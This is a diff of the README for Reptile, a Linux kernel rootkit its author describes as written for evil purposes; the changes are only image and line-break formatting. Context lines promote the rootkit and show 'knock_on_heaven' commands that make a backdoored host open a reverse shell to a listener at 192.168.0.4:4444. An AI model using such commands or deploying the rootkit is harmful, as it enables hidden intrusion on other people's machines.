@@ -1,10 +1,10 @@
 # Reptile
 
-<img src="https://imgur.com/nqujOlz.png">
+<img align="left" src="https://imgur.com/nqujOlz.png">
 
-Reptile is a LKM rootkit writen for evil purposes that runs on kernel 2.6.x/3.x/4.x. Probably is the best that you will find public on the Internet. 
+<br><br><br>Reptile is a LKM rootkit writen for evil purposes that runs on kernel 2.6.x/3.x/4.x. Probably is the best that you will find public on the Internet.<br>
 
-If you are searching stuff only for study purposes, see the [demonstration codes](https://github.com/f0rb1dd3n/papers/tree/master/rootkit_demonstration).
+If you are searching stuff only for study purposes, see the [demonstration codes](https://github.com/f0rb1dd3n/papers/tree/master/rootkit_demonstration).<br><br><br>
 
 ## Features
 
@@ -40,7 +40,9 @@ Binaries will be copied to `/reptile` folder, that will be hidden by Reptile.
 
 ### Getting root privileges
 
-<img src="https://i.imgur.com/sfbpHQu.png">
+<p align="center">
+   <img src="https://i.imgur.com/sfbpHQu.png">
+</p>
 
 ### Hiding
 
@@ -79,7 +81,9 @@ UDP:  ./knock_on_heaven -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 53 -d "F
 TCP:  ./knock_on_heaven -x tcp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 80 -d "F0rb1dd3n 192.168.0.4 4444" -l
 
 ```
-<img src="https://i.imgur.com/zvFWuXT.png">
+<p align="center">
+   <img src="https://i.imgur.com/zvFWuXT.png">
+</p>
 
 ## Disclaimer
 
@@ -101,4 +105,6 @@ I am open to receiving contributions. If you can contribute with this project, d
 
 I will consider writing new features with contribution to my BTC Wallet: `1ASRMARFrpSanLHXCdNHD7K7pvr1fbK2fb`
 
-<img src="https://imgur.com/RdYgb1T.gif">
+<p align="center">
+   <img src="https://imgur.com/RdYgb1T.gif">
+</p>
